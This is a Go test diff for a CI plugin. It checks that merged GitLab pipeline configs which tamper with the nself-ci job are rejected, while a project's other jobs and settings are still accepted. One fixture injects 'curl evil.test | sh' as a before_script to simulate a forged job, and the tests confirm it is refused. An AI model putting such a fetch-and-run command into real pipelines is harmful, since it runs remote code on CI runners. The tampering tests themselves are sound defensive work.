@@ -14,6 +14,7 @@ import (
 
 	"github.com/nself-org/plugins/free/ci/internal/model"
 	"github.com/nself-org/plugins/free/ci/internal/providers"
+	"github.com/nself-org/plugins/free/ci/internal/providers/gitlab/pipeline"
 	"github.com/nself-org/plugins/free/ci/internal/providers/hostedev"
 	gitlabtmpl "github.com/nself-org/plugins/free/ci/templates/gitlab"
 )
@@ -86,6 +87,26 @@ func TestEvidenceRejections(t *testing.T) {
 		{name: "job was retried", version: "18.2.1-ee", reason: hostedev.ReasonRerun, edit: func(_ *fakeGL, p *fakePipe) {
 			p.Jobs = append(p.Jobs, &fakeJob{ID: 7777, Name: gitlabtmpl.Job, Status: "failed"})
 		}},
+		{name: "project overrides the nself-ci job script", version: "18.2.1-ee", reason: hostedev.ReasonEdited, tune: func(f *fakeGL) {
+			f.Merged = mergedFrom(t, f.Include, func(top map[string]any) { top["nself-ci"].(map[string]any)["script"] = []any{"echo forged"} })
+		}},
+		{name: "project adds a key to the nself-ci job", version: "18.2.1-ee", reason: hostedev.ReasonEdited, tune: func(f *fakeGL) {
+			f.Merged = mergedFrom(t, f.Include, func(top map[string]any) {
+				top["nself-ci"].(map[string]any)["before_script"] = []any{"curl evil.test | sh"}
+			})
+		}},
+		{name: "merged config has no nself-ci job", version: "18.2.1-ee", reason: hostedev.ReasonEdited, tune: func(f *fakeGL) {
+			f.Merged = mergedFrom(t, f.Include, func(top map[string]any) { delete(top, "nself-ci") })
+		}},
+		{name: "global before_script is inherited", version: "18.2.1-ee", reason: hostedev.ReasonEdited, tune: func(f *fakeGL) {
+			f.Merged = mergedFrom(t, f.Include, func(top map[string]any) { top["before_script"] = []any{"echo hi"} })
+		}},
+		{name: "default cache is inherited", version: "18.2.1-ee", reason: hostedev.ReasonEdited, tune: func(f *fakeGL) {
+			f.Merged = mergedFrom(t, f.Include, func(top map[string]any) { top["default"] = map[string]any{"cache": map[string]any{"key": "shared"}} })
+		}},
+		{name: "merged config unreadable", version: "18.2.1-ee", reason: pipeline.ReasonConfig, tune: func(f *fakeGL) { f.LintSt = 404 }},
+		{name: "merged config invalid", version: "18.2.1-ee", reason: pipeline.ReasonConfig, tune: func(f *fakeGL) { f.LintBad = true }},
+		{name: "merged config is not yaml", version: "18.2.1-ee", reason: pipeline.ReasonConfig, tune: func(f *fakeGL) { f.Merged = "a: [unclosed" }},
 		{name: "no nself-ci job", version: "18.2.1-ee", reason: hostedev.ReasonPath, edit: func(_ *fakeGL, p *fakePipe) { p.Jobs[0].Name = "other" }},
 		{name: "no artifact", version: "18.2.1-ee", reason: hostedev.ReasonMissing, edit: func(_ *fakeGL, p *fakePipe) { p.Jobs[0].Zip = nil }},
 		{name: "artifact expired", version: "18.2.1-ee", reason: hostedev.ReasonMissing, edit: func(_ *fakeGL, p *fakePipe) { p.Jobs[0].Expired = true }},
@@ -152,4 +173,25 @@ func TestCollectRefusals(t *testing.T) {
 	if _, err = p.Collect(ctx, h); err != nil {
 		t.Fatalf("the accepted path broke after the refusals: %v", err)
 	}
+}
+
+// TestMergedConfigKeepsOtherProjectSettings proves the merged check is not a veto on a project's own
+// CI file: other jobs, global variables, stages and default settings that do not change what a job
+// runs are accepted, and a transient lint failure stays retryable.
+func TestMergedConfigKeepsOtherProjectSettings(t *testing.T) {
+	ctx := context.Background()
+	f, p, h := dispatched(t, "18.2.1-ee", func(f *fakeGL) {
+		f.Merged = mergedFrom(t, f.Include, func(top map[string]any) {
+			top["lint"] = map[string]any{"script": []any{"make lint"}}
+			top["stages"] = []any{"build", "test"}
+			top["default"] = map[string]any{"interruptible": true, "retry": 1}
+		})
+	})
+	f.finish(9001, "attempt-1", testRevision, nil)
+	if _, err := p.Collect(ctx, h); err != nil {
+		t.Fatalf("a project with its own jobs was refused: %v", err)
+	}
+	f.LintSt = 503
+	_, err := p.Collect(ctx, h)
+	wantCode(t, err, "E704", "")
 }
